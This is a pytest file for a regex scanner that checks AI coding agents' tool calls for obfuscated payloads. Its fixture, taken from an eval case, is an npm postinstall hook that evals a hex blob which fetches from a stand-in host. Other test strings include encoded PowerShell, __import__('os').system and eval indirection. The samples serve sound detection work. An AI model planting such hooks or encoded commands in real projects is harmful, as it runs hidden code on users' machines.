"""Tests for agentwarden.obfuscation (spec 022). No network, no model calls.

The scanner is pure regex over strings in `tool_input`; these tests build `ToolEvent`s by hand
and never touch a provider.
"""

from __future__ import annotations

import pytest

from agentwarden.models import ToolEvent

# The exact `new_string` / `old_string` from eval/cases/holdout.jsonl,
# case id persistence-npmpostinstallhex-257 (read, not edited).
HEX_CASE_OLD_STRING = '"scripts": {'
HEX_CASE_NEW_STRING = (
    '"scripts": {\n    "postinstall": "node -e \\"eval(Buffer.from('
    "'726571756972652827687474707327292e676574282268747470733a2f2f6578616d706c652e696e76616c69"
    "642f706f73742d696e7374616c6c2729', 'hex').toString())\\\"\","
)


def _event(tool_name: str = "Bash", tool_input: dict | None = None) -> ToolEvent:
    return ToolEvent(
        session_id="s1",
        cwd="D:/proj",
        hook_event_name="PreToolUse",
        tool_name=tool_name,
        tool_input=tool_input if tool_input is not None else {},
    )


def _signals(tool_name: str = "Bash", tool_input: dict | None = None) -> list[str]:
    from agentwarden.obfuscation import signals

    return signals(_event(tool_name, tool_input))


# --- positive: one test per signal --------------------------------------------------------


def test_hex_postinstall_case_gives_decode_blob_and_decode_exec():
    result = _signals(
        "Edit",
        {
            "file_path": "package.json",
            "old_string": HEX_CASE_OLD_STRING,
            "new_string": HEX_CASE_NEW_STRING,
        },
    )
    assert result == ["decode_blob", "decode_exec"]


def test_decode_exec_signal_without_long_blob():
    # atob() (decode call) wrapped directly in eval() (execution sink); the decoded blob is
    # short, so decode_blob must not also fire here.
    result = _signals("Bash", {"command": "node -e \"eval(atob('c2hvcnQ='))\""})
    assert "decode_exec" in result
    assert "decode_blob" not in result


def test_decode_blob_signal_without_execution_sink():
    # Buffer.from(..., 'hex') (decode call) with a >=32 char hex run, but nothing executes it.
    long_hex = "41424344454647484950515253545556575859303132333435363738393031"  # 64 chars
    assert len(long_hex) >= 32
    result = _signals("Write", {"content": f"const buf = Buffer.from('{long_hex}', 'hex');"})
    assert "decode_blob" in result
    assert "decode_exec" not in result


def test_ps_encoded_signal():
    b64 = "JABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAA=="  # > 20 chars
    assert len(b64) >= 20
    result = _signals("Bash", {"command": f"powershell -EncodedCommand {b64}"})
    assert "ps_encoded" in result


@pytest.mark.parametrize(
    "command",
    [
        "powershell -e JABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAA==",
        "powershell -enc JABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAA==",
    ],
)
def test_ps_encoded_signal_short_flags(command):
    result = _signals("Bash", {"command": command})
    assert "ps_encoded" in result


def test_char_codes_signal_from_string_fromcharcode():
    result = _signals("Write", {"content": "var x = String.fromCharCode(104, 105);"})
    assert "char_codes" in result


def test_char_codes_signal_from_four_chr_calls():
    result = _signals("Bash", {"command": 'python -c "print(chr(104)+chr(105)+chr(33)+chr(63))"'})
    assert "char_codes" in result


def test_char_codes_signal_from_eight_hex_escapes():
    payload = "".join(f"\\x{n:02x}" for n in range(8))
    result = _signals("Write", {"content": f'b"{payload}"'})
    assert "char_codes" in result


def test_dynamic_import_signal_dunder_import():
    result = _signals("Bash", {"command": "python -c \"__import__('os').system('ls')\""})
    assert "dynamic_import" in result


def test_dynamic_import_signal_getattr_builtins():
    result = _signals("Bash", {"command": "python -c \"getattr(__builtins__, 'eval')('1')\""})
    assert "dynamic_import" in result


@pytest.mark.parametrize(
    "command",
    ['eval "$x"', "eval $(cat payload)", 'echo "${!name}"'],
)
def test_eval_indirection_signal(command):
    result = _signals("Bash", {"command": command})
    assert "eval_indirection" in result


# --- negatives -------------------------------------------------------------------------------


def test_git_sha_alone_is_not_a_signal():
    result = _signals("Bash", {"command": "git show a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4"})
    assert result == []


def test_lockfile_sha512_integrity_is_not_a_signal():
    integrity = "sha512-" + "a" * 86 + "=="
    result = _signals("Write", {"content": f'"integrity": "{integrity}"'})
    assert result == []


def test_data_uri_image_in_write_content_is_not_a_signal():
    data_uri = "data:image/png;base64," + "A" * 60
    result = _signals("Write", {"content": data_uri})
    assert result == []


def test_base64_decode_without_blob_or_sink_is_not_a_signal():
    result = _signals("Bash", {"command": "base64 -d file > out"})
    assert result == []


def test_plain_npm_test_is_not_a_signal():
    result = _signals("Bash", {"command": "npm test"})
    assert result == []


def test_empty_tool_input_is_not_a_signal():
    assert _signals("Bash", {}) == []


def test_non_string_tool_input_values_do_not_raise():
    result = _signals(
        "Bash",
        {
            "count": 5,
            "flags": [1, 2, 3],
            "nested": {"n": None, "ok": True, "deep": {"x": 7}},
            "command": "npm test",
        },
    )
    assert result == []


def test_obfuscated_payload_only_in_old_string_is_not_a_signal():
    result = _signals(
        "Edit",
        {
            "file_path": "package.json",
            "old_string": HEX_CASE_NEW_STRING,
            "new_string": '"scripts": {}',
        },
    )
    assert result == []


def test_obfuscated_payload_in_edits_new_string_is_a_signal():
    result = _signals(
        "MultiEdit",
        {
            "file_path": "package.json",
            "edits": [
                {"old_string": HEX_CASE_OLD_STRING, "new_string": HEX_CASE_NEW_STRING},
            ],
        },
    )
    assert "decode_blob" in result
    assert "decode_exec" in result


def test_obfuscated_payload_in_edits_old_string_is_skipped():
    result = _signals(
        "MultiEdit",
        {
            "file_path": "package.json",
            "edits": [
                {"old_string": HEX_CASE_NEW_STRING, "new_string": '"scripts": {}'},
            ],
        },
    )
    assert result == []


def test_decode_and_sink_split_across_edits_is_a_signal():
    blob = "41424344454647484950515253545556575859303132333435363738393031"
    result = _signals(
        "MultiEdit",
        {
            "file_path": "index.js",
            "edits": [
                {"old_string": "a", "new_string": f"const x = Buffer.from('{blob}', 'hex');"},
                {"old_string": "b", "new_string": "eval(x.toString());"},
            ],
        },
    )
    assert "decode_exec" in result


# --- performance: the scan must stay linear on large content ---------------------------------


@pytest.mark.parametrize(
    "chunk",
    [
        "powershell -x ",
        "openssl enc -aes ",
        "Buffer.from(abc ",
        "chr(1)+",
        "\\x41",
        "a" * 39 + " ",
        "base64 -d x | ",
    ],
)
def test_large_repetitive_content_scans_fast(chunk):
    import time

    content = chunk * (1_000_000 // len(chunk))
    start = time.monotonic()
    _signals("Write", {"content": content})
    assert time.monotonic() - start < 1.0


# --- failure path: internal scanner error -----------------------------------------------------


def test_obfuscation_scan_error_escalates(monkeypatch):
    """An internal scanner error must never raise; it reports as the `scan_error` signal.

    Implementation note for whoever writes `obfuscation.py`: this monkeypatches a module-level
    `PATTERNS` dict (name -> compiled regex) and makes iterating it blow up, simulating a bug in
    the pattern table. Pick this name (`agentwarden.obfuscation.PATTERNS`) for the compiled
    pattern table so this test exercises the real failure path instead of over-constraining the
    implementation to a specific private helper.
    """
    import agentwarden.obfuscation as obfuscation_module

    class _BoomPatterns(dict):
        def items(self):
            raise RuntimeError("boom: pattern table is broken")

    monkeypatch.setattr(obfuscation_module, "PATTERNS", _BoomPatterns())

    result = obfuscation_module.signals(_event("Bash", {"command": "npm test"}))
    assert result == ["scan_error"]
